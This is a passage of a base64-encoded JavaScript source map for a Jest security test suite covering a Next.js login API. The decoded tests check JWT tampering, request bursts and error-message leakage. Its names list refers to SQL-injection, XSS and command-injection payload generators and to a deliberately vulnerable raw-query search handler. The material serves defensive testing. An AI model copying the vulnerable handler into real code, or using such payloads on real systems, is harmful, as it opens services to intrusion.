3BheWxvYWR9LnRhbXBlcmVkX3NpZ25hdHVyZWA7XG4gICAgICBcbiAgICAgIGV4cGVjdCgoKSA9PiB7XG4gICAgICAgIGp3dC52ZXJpZnkodGFtcGVyZWRUb2tlbiwgcHJvY2Vzcy5lbnYuSldUX1NFQ1JFVCEpO1xuICAgICAgfSkudG9UaHJvdygnaW52YWxpZCBzaWduYXR1cmUnKTtcbiAgICB9KTtcbiAgfSk7XG5cbiAgZGVzY3JpYmUoJ1JhdGUgTGltaXRpbmcgU2ltdWxhdGlvbicsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIGhhbmRsZSByYXBpZCBzdWNjZXNzaXZlIHJlcXVlc3RzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgY29uc3QgcmVxdWVzdHMgPSBBcnJheS5mcm9tKHsgbGVuZ3RoOiAxMDAgfSwgKCkgPT4gXG4gICAgICAgIG5ldyBOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICAgIG1ldGhvZDogJ1BPU1QnLFxuICAgICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtcbiAgICAgICAgICAgIGVtYWlsOiAndGVzdEBleGFtcGxlLmNvbScsXG4gICAgICAgICAgICBwYXNzd29yZDogJ3Bhc3N3b3JkMTIzJyxcbiAgICAgICAgICB9KSxcbiAgICAgICAgICBoZWFkZXJzOiB7XG4gICAgICAgICAgICAnQ29udGVudC1UeXBlJzogJ2FwcGxpY2F0aW9uL2pzb24nLFxuICAgICAgICAgICAgJ1gtRm9yd2FyZGVkLUZvcic6ICcxOTIuMTY4LjEuMTAwJyxcbiAgICAgICAgICB9LFxuICAgICAgICB9KVxuICAgICAgKTtcblxuICAgICAgLy8gSW4gYSByZWFsIGltcGxlbWVudGF0aW9uLCB0aGlzIHdvdWxkIHRyaWdnZXIgcmF0ZSBsaW1pdGluZ1xuICAgICAgY29uc3QgcmVzcG9uc2VzID0gYXdhaXQgUHJvbWlzZS5hbGwoXG4gICAgICAgIHJlcXVlc3RzLm1hcChyZXEgPT4gc2VjdXJlQXV0aEhhbmRsZXIocmVxKSlcbiAgICAgICk7XG5cbiAgICAgIC8vIEFsbCByZXF1ZXN0cyBzaG91bGQgYmUgcHJvY2Vzc2VkIChpbiByZWFsIGFwcCwgc29tZSB3b3VsZCBiZSByYXRlIGxpbWl0ZWQpXG4gICAgICByZXNwb25zZXMuZm9yRWFjaChyZXNwb25zZSA9PiB7XG4gICAgICAgIGV4cGVjdChbNDAwLCA0MDEsIDQyOV0pLnRvQ29udGFpbihyZXNwb25zZS5zdGF0dXMpOyAvLyA0MjkgPSBUb28gTWFueSBSZXF1ZXN0c1xuICAgICAgfSk7XG4gICAgfSk7XG4gIH0pO1xuXG4gIGRlc2NyaWJlKCdFcnJvciBIYW5kbGluZyBTZWN1cml0eScsICgpID0+IHtcbiAgICBpdCgnc2hvdWxkIG5vdCBleHBvc2Ugc2Vuc2l0aXZlIGluZm9ybWF0aW9uIGluIGVycm9yIG1lc3NhZ2VzJywgYXN5bmMgKCkgPT4ge1xuICAgICAgLy8gU2ltdWxhdGUgZGF0YWJhc2UgZXJyb3JcbiAgICAgIG1vY2tQcmlzbWEudXNlci5maW5kVW5pcXVlLm1vY2tSZWplY3RlZFZhbHVlKG5ldyBFcnJvcignQ29ubmVjdGlvbiBmYWlsZWQgdG8gZGF0YWJhc2UgXCJtZF9zcG9ydHNcIiBvbiBob3N0IFwibG9jYWxob3N0XCInKSk7XG4gICAgICBcbiAgICAgIGNvbnN0IHJlcXVlc3QgPSBuZXcgTmV4dFJlcXVlc3QoJ2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMC9hcGkvYXV0aC9sb2dpbicsIHtcbiAgICAgICAgbWV0aG9kOiAnUE9TVCcsXG4gICAgICAgIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtcbiAgICAgICAgICBlbWFpbDogJ3Rlc3RAZXhhbXBsZS5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9KSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICBcbiAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNTAwKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS50b0JlKCdJbnRlcm5hbCBzZXJ2ZXIgZXJyb3InKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCdkYXRhYmFzZScpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ2xvY2FsaG9zdCcpO1xuICAgICAgZXhwZWN0KGRhdGEuZXJyb3IpLm5vdC50b0NvbnRhaW4oJ21kX3Nwb3J0cycpO1xuICAgIH0pO1xuXG4gICAgaXQoJ3Nob3VsZCB1c2UgZ2VuZXJpYyBlcnJvciBtZXNzYWdlcyBmb3IgYXV0aGVudGljYXRpb24gZmFpbHVyZXMnLCBhc3luYyAoKSA9PiB7XG4gICAgICBtb2NrUHJpc21hLnVzZXIuZmluZFVuaXF1ZS5tb2NrUmVzb2x2ZWRWYWx1ZShudWxsKTtcbiAgICAgIFxuICAgICAgY29uc3QgcmVxdWVzdCA9IG5ldyBOZXh0UmVxdWVzdCgnaHR0cDovL2xvY2FsaG9zdDozMDAwL2FwaS9hdXRoL2xvZ2luJywge1xuICAgICAgICBtZXRob2Q6ICdQT1NUJyxcbiAgICAgICAgYm9keTogSlNPTi5zdHJpbmdpZnkoe1xuICAgICAgICAgIGVtYWlsOiAnbm9uZXhpc3RlbnRAZXhhbXBsZS5jb20nLFxuICAgICAgICAgIHBhc3N3b3JkOiAncGFzc3dvcmQxMjMnLFxuICAgICAgICB9KSxcbiAgICAgICAgaGVhZGVyczoge1xuICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsXG4gICAgICAgIH0sXG4gICAgICB9KTtcblxuICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBzZWN1cmVBdXRoSGFuZGxlcihyZXF1ZXN0KTtcbiAgICAgIGNvbnN0IGRhdGEgPSBhd2FpdCByZXNwb25zZS5qc29uKCk7XG4gICAgICBcbiAgICAgIGV4cGVjdChyZXNwb25zZS5zdGF0dXMpLnRvQmUoNDAxKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS50b0JlKCdJbnZhbGlkIGNyZWRlbnRpYWxzJyk7XG4gICAgICBleHBlY3QoZGF0YS5lcnJvcikubm90LnRvQ29udGFpbigndXNlciBub3QgZm91bmQnKTtcbiAgICAgIGV4cGVjdChkYXRhLmVycm9yKS5ub3QudG9Db250YWluKCdlbWFpbCcpO1xuICAgIH0pO1xuICB9KTtcbn0pOyJdLCJuYW1lcyI6WyJTZWN1cml0eVRlc3RVdGlscyIsImdlbmVyYXRlU1FMSW5qZWN0aW9uUGF5bG9hZHMiLCJnZW5lcmF0ZVhTU1BheWxvYWRzIiwiZ2VuZXJhdGVDb21tYW5kSW5qZWN0aW9uUGF5bG9hZHMiLCJnZW5lcmF0ZUxvbmdTdHJpbmdzIiwicmVwZWF0IiwiZ2VuZXJhdGVJbnZhbGlkVG9rZW5zIiwiaGFzaFBhc3N3b3JkIiwicGFzc3dvcmQiLCJiY3J5cHQiLCJoYXNoIiwiZ2VuZXJhdGVWYWxpZEpXVCIsInBheWxvYWQiLCJzZWNyZXQiLCJqd3QiLCJzaWduIiwiZXhwaXJlc0luIiwiZ2VuZXJhdGVFeHBpcmVkSldUIiwibW9ja1ByaXNtYSIsInVzZXIiLCJmaW5kVW5pcXVlIiwiamVzdCIsImZuIiwiZmluZE1hbnkiLCJjcmVhdGUiLCJ1cGRhdGUiLCJwcm9kdWN0IiwiJHF1ZXJ5UmF3IiwiJGV4ZWN1dGVSYXciLCJ2dWxuZXJhYmxlU2VhcmNoSGFuZGxlciIsInJlcSIsInVybCIsIlVSTCIsInF1ZXJ5Iiwic2VhcmNoUGFyYW1zIiwiZ2V0IiwiTmV4dFJlc3BvbnNlIiwianNvbiIsImVycm9yIiwic3RhdHVzIiwicmVzdWx0cyIsInNlY3VyZVNlYXJjaEhhbmRsZXIiLCJsZW5ndGgiLCJzYW5pdGl6ZWRRdWVyeSIsInJlcGxhY2UiLCJ3aGVyZSIsIm5hbWUiLCJjb250YWlucyIsIm1vZGUiLCJzZWN1cmVBdXRoSGFuZGxlciIsImJvZHkiLCJlbWFpbCIsImNsaWVudElQIiwiaGVhZGVycyIsImVtYWlsUmVnZXgiLCJ0ZXN0Iiwic3VzcGljaW91c1BhdHRlcm5zIiwiaXNTdXNwaWNpb3VzIiwic29tZSIsInBhdHRlcm4iLCJQcm9taXNlIiwicmVzb2x2ZSIsInNldFRpbWVvdXQiLCJpc1ZhbGlkIiwiY29tcGFyZSIsInRva2VuIiwidXNlcklkIiwiaWQiLCJpYXQiLCJNYXRoIiwiZmxvb3IiLCJEYXRlIiwibm93IiwicHJvY2VzcyIsImVudiIsIkpXVF9TRUNSRVQiLCJpc3N1ZXIiLCJhdWRpZW5jZSIsImRlc2NyaWJlIiwiYmVmb3JlQWxsIiwiYmVmb3JlRWFjaCIsImNsZWFyQWxsTW9ja3MiLCJpdCIsInNxbFBheWxvYWRzIiwicmVxdWVzdCIsIk5leHRSZXF1ZXN0IiwiZW5jb2RlVVJJQ29tcG9uZW50IiwicmVzcG9uc2UiLCJleHBlY3QiLCJub3QiLCJ0b0JlIiwiZGF0YSIsInRvSGF2ZVByb3BlcnR5IiwibW9ja1Jlc29sdmVkVmFsdWUiLCJ0b0hhdmVCZWVuQ2FsbGVkV2l0aCIsInhzc1BheWxvYWRzIiwicmVzcG9uc2VTdHIiLCJKU09OIiwic3RyaW5naWZ5IiwidG9NYXRjaCIsIm1ldGhvZCIsImludmFsaWRUb2tlbnMiLCJ2ZXJpZnkiLCJ0b1Rocm93IiwiZXhwaXJlZFRva2VuIiwiaXNJbnZhbGlkIiwidmFsaWRFbWFpbCIsImludmFsaWRFbWFpbCIsIm1vY2tJbXBsZW1lbnRhdGlvbiIsInZhbGlkUmVxdWVzdCIsImludmFsaWRSZXF1ZXN0Iiwic3RhcnQxIiwicmVzcG9uc2UxIiwidGltZTEiLCJzdGFydDIiLCJyZXNwb25zZTIiLCJ0aW1lMiIsImFicyIsInRvQmVMZXNzVGhhbiIsImxvbmdTdHJpbmdzIiwibG9uZ1N0cmluZyIsImludmFsaWRFbWFpbHMiLCJtYWxpY2lvdXNJbnB1dHMiLCJpbnB1dCIsImNvbW1hbmRQYXlsb2FkcyIsImlzVmFsaWRGaWxlTmFtZSIsImZpbGVuYW1lIiwiZGVjb2RlZCIsInRvQmVEZWZpbmVkIiwiZXhwIiwiaGVhZGVyIiwiQnVmZmVyIiwiZnJvbSIsImFsZyIsInR5cCIsInRvU3RyaW5nIiwibm9uZVRva2VuIiwidmFsaWRUb2tlbiIsInNwbGl0IiwidGFtcGVyZWRUb2tlbiIsInJlcXVlc3RzIiwiQXJyYXkiLCJyZXNwb25zZXMiLCJhbGwiLCJtYXAiLCJmb3JFYWNoIiwidG9Db250YWluIiwibW9ja1JlamVjdGVkVmFsdWUiLCJFcnJvciJdLCJtYXBwaW5ncyI6Ijs7Ozt5QkFBc0U7d0JBQzVCO3FFQUMxQjtpRUFDRzs7Ozs7O0FBR25CLDBCQUEwQjtBQUMxQixNQUFNQTtJQUNKLE9BQU9DLCtCQUF5QztRQUM5QyxPQUFPO1lBQ0w7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7U0FDRDtJQUNIO0lBRUEsT0FBT0Msc0JBQWdDO1FBQ3JDLE9BQU87WUFDTDtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7WUFDQTtTQUNEO0lBQ0g7SUFFQSxPQUFPQyxtQ0FBNkM7UUFDbEQsT0FBTztZQUNMO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1NBQ0Q7SUFDSDtJQUVBLE9BQU9DLHNCQUFnQztRQUNyQyxPQUFPO1lBQ0wsSUFBSUMsTUFBTSxDQUFDO1lBQ1gsSUFBSUEsTUFBTSxDQUFDO1lBQ1gsSUFBSUEsTUFBTSxDQUFDO1lBQ1gsS0FBT0EsTUFBTSxDQUFDO1lBQ2QsS0FBS0EsTUFBTSxDQUFDO1lBQ1osS0FBS0EsTUFBTSxDQUFDO1NBQ2I7SUFDSDtJQUVBLE9BQU9DLHdCQUFrQztRQUN2QyxPQUFPO1lBQ0w7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7WUFDQTtZQUNBO1lBQ0E7U0FDRDtJQUNIO0lBRUEsYUFBYUMsYUFBYUMsUUFBZ0IsRUFBbUI7UUFDM0QsT0FBT0MsaUJBQU0sQ0FBQ0MsSUFBSSxDQUFDRixVQUFVO0lBQy9CO0lBRUEsT0FBT0csaUJBQ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